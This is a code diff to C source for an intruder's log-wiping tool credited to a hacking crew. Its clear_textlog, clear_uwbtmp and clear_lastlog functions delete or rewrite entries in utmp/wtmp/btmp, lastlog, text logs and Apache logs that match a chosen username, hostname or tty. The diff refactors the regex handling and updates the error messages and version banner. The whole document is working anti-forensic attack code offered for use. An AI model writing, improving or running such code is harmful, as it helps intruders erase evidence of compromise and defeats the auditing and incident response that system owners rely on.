@@ -31,8 +31,9 @@
  * 
  * Revision History:
  *
- * Pashkela - with apache log files
- * Hui Li - reformat and bug fix
+ * Unknown Year - Pashkela - add apache log files
+ * Jan. 2024 - Hui Li - reformat, rewrite xgethostname, compile_pattern
+ *                      functions and other bug fixes
  */ 
 #include <stdio.h>
 #include <sys/param.h>
@@ -167,6 +168,11 @@ char *APACHE_PATH[]=
 #define PROGRAM_RELEASE 1
 #define AUTHORS "Shad0S [Hell Knights Crew]"
 
+typedef struct {
+    regex_t regex_pattern;
+    int regex_state;
+} regex_info;
+
 char *myname; /* program name */
 int do_ignorecase = 0; /* -i option: ignore case */
 int do_extended = 0; /* -E option: use extended RE's */
@@ -179,13 +185,16 @@ int errors = 0; /* number of errors */
 regex_t username;
 regex_t hostname;
 regex_t tty;
+regex_info *username_regex;
+regex_info *tty_regex;
+regex_info *hostname_regex;
 
 static int copy_tmp(char *dstfilename, char *tmpfilename);
 static int clear_textlog(char *filename);
 static int clear_uwbtmp(char *filename);
 static int clear_lastlog (char *filename);
-static regex_t compile_pattern(const char *pat);
-static int process_regexp(regex_t *pattern, char *buf, size_t size);
+static regex_info *compile_pattern(const char *pat);
+static int process_regexp(regex_t *pattern, char *buf);
 static char *xgethostname(void);
 static void usage(void);
 static void version(void);
@@ -218,24 +227,45 @@ int main(int argc, char *argv[]){
     while ((c = getopt_long(argc, argv, "u:t:a:reihVW;", longopts, NULL)) != -1) {
       switch (c) {
        case 'u':
-        username = compile_pattern(optarg);
-        if (errors) {
-            usage(); //compile failed
+        username_regex = compile_pattern(optarg);
+        if (username_regex == NULL) {
+            usage();
+        } else {
+            if (username_regex->regex_state == 0) {
+                username = username_regex->regex_pattern;
+            } else {
+                usage();
+            }
         }
+
         do_username=1;
         break;
        case 't':
-        tty = compile_pattern(optarg);
-        if (errors) {
-            usage(); //compile failed
+        tty_regex = compile_pattern(optarg);
+        if (tty_regex == NULL) {
+            usage();
+        } else {
+            if (tty_regex->regex_state == 0) {
+                tty = tty_regex->regex_pattern;
+            } else {
+                usage();
+            }
         }
+
         do_tty=1;
         break;
        case 'a':
-        hostname = compile_pattern(optarg);
-        if (errors) {
-            usage(); //compile failed
+        hostname_regex = compile_pattern(optarg);
+        if (hostname_regex == NULL) {
+            usage();
+        } else {
+            if (hostname_regex->regex_state == 0) {
+                hostname = hostname_regex->regex_pattern;
+            } else {
+                usage();
+            }
         }
+
         do_hostname=1; 
         break;
        case 'e':
@@ -329,6 +359,14 @@ int main(int argc, char *argv[]){
     }
     /* END APACHE LOGS */
 
+    /* free memory */
+    free(username_regex);
+    free(tty_regex);
+    free(hostname_regex);
+    username_regex = NULL;
+    tty_regex = NULL;
+    hostname_regex = NULL;
+
     return 0;
 }
 
@@ -367,11 +405,11 @@ static int clear_textlog(char *filename) {
 
     if (do_username) {
         if ((localhostname = xgethostname()) == NULL) {
-            fprintf(stderr, "%s: could not determine hostname: %s\n", myname, strerror(errno));
+            fprintf(stderr, "could not determine hostname: %s\n", strerror(errno));
             return -1; 
         } else {
-            if (process_regexp(&username, localhostname, strlen(localhostname))) {
-                fprintf(stdout, "%s: warning: local hostname (%s) is like the username string!\n", myname, localhostname);
+            if (process_regexp(&username, localhostname)) {
+                fprintf(stdout, "warning: local hostname (%s) is like the username string!\n", localhostname);
             }
         }
 
@@ -380,7 +418,7 @@ static int clear_textlog(char *filename) {
     }
 
     if ((fd = fopen(filename, "r")) == 0) {
-        fprintf(stderr, "%s: %s: could not open: %s\n", myname, filename, strerror(errno));
+        fprintf(stderr, "%s: could not open: %s\n", filename, strerror(errno));
         return -1;
     }
 
@@ -391,7 +429,7 @@ static int clear_textlog(char *filename) {
     sprintf(ftmpname, "%s/%s", tmpdir, template);
 
     if ((fdtmp = mkstemp(ftmpname)) == -1) {
-        fprintf(stderr, "%s: %s: could not create temp file: %s\n", myname, filename, strerror(errno));
+        fprintf(stderr, "%s: could not create temp file: %s\n", filename, strerror(errno));
         return -1;
     }
 
@@ -400,18 +438,18 @@ static int clear_textlog(char *filename) {
         //length of null-terminated string 
         rcnt = strlen(buftmp);
         if (do_hostname) {
-            found = process_regexp(&hostname, buftmp, rcnt);
+            found = process_regexp(&hostname, buftmp);
         }
         if (do_username) {
-            found = process_regexp(&username, buftmp, rcnt);
+            found = process_regexp(&username, buftmp);
         }
         if (do_tty) {
-            found = process_regexp(&tty, buftmp, rcnt); 
+            found = process_regexp(&tty, buftmp); 
         }
         if (!found) { 
             wcnt = write(fdtmp, buftmp, rcnt);
             if (wcnt != rcnt) {
-                fprintf(stderr, "%s: %s: write error: %s\n", myname, ftmpname, strerror(errno));
+                fprintf(stderr, "%s: write error: %s\n", ftmpname, strerror(errno));
                 errors++;
                 break;
             }
@@ -421,18 +459,18 @@ static int clear_textlog(char *filename) {
     }
 
     if ((rcnt < 0) && (errno != EXIT_SUCCESS)) {
-        fprintf(stderr, "%s: %s: read error: %s\n", myname, filename, strerror(errno));
+        fprintf(stderr, "%s: read error: %s\n", filename, strerror(errno));
         errors++;
     }
     if (fd != 0) {
         if (fclose(fd) < 0) {
-            fprintf(stderr, "%s: %s: close error: %s\n", myname, filename, strerror(errno));
+            fprintf(stderr, "%s: close error: %s\n", filename, strerror(errno));
             errors++;
         }
     }
     if (fdtmp != 0) {
         if (close(fdtmp) < 0) {
-            fprintf(stderr, "%s: %s: close error: %s\n", myname, ftmpname, strerror(errno));
+            fprintf(stderr, "%s: close error: %s\n", ftmpname, strerror(errno));
             errors++;
         }
     }
@@ -460,7 +498,7 @@ static int clear_uwbtmp(char *filename) {
     char *tmpdir;
 
     if ((fd = open(filename, O_RDONLY)) == -1) {
-        /*fprintf(stderr, "%s: %s: could not open: %s\n", myname, filename, strerror(errno));*/
+        fprintf(stderr, "%s: could not open: %s\n", filename, strerror(errno));
         return -1;
     }
     //get TMPDIR value, else use "/tmp"
@@ -469,7 +507,7 @@ static int clear_uwbtmp(char *filename) {
     }
     sprintf(ftmpname, "%s/%s", tmpdir, template);
     if ((fdtmp = mkstemp(ftmpname)) == -1) {
-        fprintf(stderr, "%s: %s: could not create temp file: %s\n", myname, filename, strerror(errno));
+        fprintf(stderr, "%s: could not create temp file: %s\n", filename, strerror(errno));
         return -1;
     }
     while ((rcnt = read(fd, &entry, sizeof(struct utmp))) > 0) {
@@ -479,18 +517,18 @@ static int clear_uwbtmp(char *filename) {
         printf("name: %s\n", entry.ut_name);*/
 #endif
         if (do_hostname) {
-            found = process_regexp(&hostname, entry.ut_host, sizeof(entry.ut_host));
+            found = process_regexp(&hostname, entry.ut_host);
         }
         if (do_username) {
-            found = process_regexp(&username, entry.ut_name, sizeof(entry.ut_name));
+            found = process_regexp(&username, entry.ut_name);
         }
         if (do_tty) {
-            found = process_regexp(&tty, entry.ut_line, sizeof(entry.ut_line));
+            found = process_regexp(&tty, entry.ut_line);
         }
         if (!found) { 
             wcnt = write(fdtmp, &entry, sizeof(struct utmp));
             if (wcnt != rcnt) {
-                fprintf(stderr, "%s: %s: write error: %s\n", myname, ftmpname, strerror(errno));
+                fprintf(stderr, "%s: write error: %s\n", ftmpname, strerror(errno));
                 errors++;
                 break;
             }
@@ -498,19 +536,19 @@ static int clear_uwbtmp(char *filename) {
         found = 0;
     }
     if (rcnt < 0) {
-        fprintf(stderr, "%s: %s: read error: %s\n", myname, filename, strerror(errno));
+        fprintf(stderr, "%s: read error: %s\n", filename, strerror(errno));
         errors++;
     }
 
     if (fd != 0) {
         if (close(fd) < 0) {
-            fprintf(stderr, "%s: %s: close error: %s\n", myname, filename, strerror(errno));
+            fprintf(stderr, "%s: close error: %s\n", filename, strerror(errno));
             errors++;
         }
     }
     if (fdtmp != 0) {
         if (close(fdtmp) < 0) {
-            fprintf(stderr, "%s: %s: close error: %s\n", myname, ftmpname, strerror(errno));
+            fprintf(stderr, "%s: close error: %s\n", ftmpname, strerror(errno));
             errors++;
         }
     }
@@ -531,28 +569,28 @@ static int clear_lastlog (char *filename) {
     ssize_t rcnt, wcnt;
 
     if ((fd = open(filename, O_RDWR)) < 0) {
-        fprintf(stderr, "%s: %s: could not open: %s\n", myname, filename, strerror(errno));
+        fprintf(stderr, "%s: could not open: %s\n", filename, strerror(errno));
         return -1;
     }
 
     /* set position to the beginning of the file */
     if (lseek(fd, (off_t)0, SEEK_SET) == (off_t)-1) {
-        fprintf(stderr, "%s: %s: could not set position in file: %s\n", myname, filename, strerror(errno));
+        fprintf(stderr, "%s: could not set position in file: %s\n", filename, strerror(errno));
         return -1;
     }
 
     while ((rcnt = read(fd, &entry, sizeof(struct lastlog))) > 0) {
         if (do_username) {
             if ((pwd = getpwuid(uid)) != NULL) {
-                found = process_regexp(&username, pwd->pw_name, sizeof(pwd->pw_name)); 
+                found = process_regexp(&username, pwd->pw_name); 
             }
             uid++;
         }
         if (do_hostname) {
-            found = process_regexp(&hostname, entry.ll_host, sizeof(entry.ll_host));
+            found = process_regexp(&hostname, entry.ll_host);
         }
         if (do_tty) {
-            found = process_regexp(&tty, entry.ll_line, sizeof(entry.ll_line)); 
+            found = process_regexp(&tty, entry.ll_line); 
         }
         if (found) {
             //XXX is this correct?
@@ -560,25 +598,25 @@ static int clear_lastlog (char *filename) {
             found = 0;
         }
         if (lseek(fd, -(off_t)rcnt, SEEK_CUR) == (off_t)-1) {
-            fprintf(stderr, "%s: %s: could not set position in file: %s\n", myname, filename, strerror(errno));
+            fprintf(stderr, "%s: could not set position in file: %s\n", filename, strerror(errno));
             return -1;
         }
         wcnt = write(fd, &entry, sizeof(struct lastlog));
         if (wcnt != rcnt) {
-            fprintf(stderr, "%s: %s: write error: %s\n", myname, filename, strerror(errno));
+            fprintf(stderr, "%s: write error: %s\n", filename, strerror(errno));
             errors++;
             break;
         }
     }
 
     if (rcnt < 0) {
-        fprintf(stderr, "%s: %s: read error: %s\n", myname, filename, strerror(errno));
+        fprintf(stderr, "%s: read error: %s\n", filename, strerror(errno));
         errors++;
     }
 
     if (fd != 0) {
         if (close(fd) < 0) {
-            fprintf(stderr, "%s: %s: close error: %s\n", myname, filename, strerror(errno));
+            fprintf(stderr, "%s: close error: %s\n", filename, strerror(errno));
             errors++;
         }
     }
@@ -587,12 +625,16 @@ static int clear_lastlog (char *filename) {
 }
 
 /* compile the regex pattern */
-static regex_t compile_pattern(const char *pat) {
+static regex_info *compile_pattern(const char *pat) {
     int flags = REG_NOSUB; /* don't need where-matched info */
-    int ret;
+    int ret = 0;
     regex_t pattern;
-    #define MSGBUFSIZE 512 /* arbitrary */
-    char error[MSGBUFSIZE];
+    char error[BUFSIZ];
+    regex_info *regex_compile_pattern = (regex_info *)malloc(sizeof(regex_info));
+    if (regex_compile_pattern == NULL) {
+        perror("failed to allocate memory for regex_compile_pattern");
+        return NULL;
+    }
 
     if (do_ignorecase) {
         flags |= REG_ICASE;
@@ -603,29 +645,42 @@ static regex_t compile_pattern(const char *pat) {
 
     ret = regcomp(&pattern, pat, flags);
     if (ret != 0) {
-        (void) regerror(ret, &pattern, error, sizeof error);
-        fprintf(stderr, "%s: pattern `%s': %s\n", myname, pat, error);
+        regerror(ret, &pattern, error, sizeof error);
+        fprintf(stderr, "pattern `%s': %s\n", pat, error);
         errors++;
-    } else {
-        return pattern;
     }
+
+    regex_compile_pattern->regex_pattern = pattern;
+    regex_compile_pattern->regex_state = ret;
+
+#ifdef DEBUG
+    printf("regex pattern: [%s] regex error code: %d\n", pat, regex_compile_pattern->regex_state);
+#endif
+
+    return regex_compile_pattern;
 }
 
 /* process regular expression */
-static int process_regexp(regex_t *pattern, char *buf, size_t size) {
-    char error[MSGBUFSIZE];
+static int process_regexp(regex_t *pattern, char *buf) {
+    char error[BUFSIZ];
     int ret;
 
     if ((ret = regexec(pattern, buf, 0, NULL, 0)) != 0) {
         if (ret != REG_NOMATCH) {
-            (void) regerror(ret, pattern, error, sizeof error);
-            fprintf(stderr, "%s: %s\n", myname, error);
+            regerror(ret, pattern, error, sizeof error);
+            fprintf(stderr, "regexec() error: %s\n", error);
             errors++;
-            return 0;
-        } else {
-            return 1;
-        } 
+        }
+
+#ifdef DEBUG
+    printf("regexec return error code: %d\n", ret);
+#endif
+
+        return 0;
     } else {
+#ifdef DEBUG
+    printf("regexec return error code: %d\n", ret);
+#endif
         return 1;
     }
 }
@@ -676,7 +731,7 @@ static void usage(void) {
 /* print version information */
 static void version(void) {
     fprintf(stdout, "\t ==========================================================================================================\n"); 
-    fprintf(stdout, "\t = \033[1m%s %1.1f.%d by %s, 2007.\033[0m =\n", 
+    fprintf(stdout, "\t = \033[1m%s %1.1f.%d by %s, 2024.\033[0m =\n", 
         PROGRAM_NAME, PROGRAM_VERSION, PROGRAM_RELEASE, AUTHORS "[Pashkela edition for rdot.org] [Hui Li]");
     fprintf(stdout, "\t ==========================================================================================================\n"); 
 }
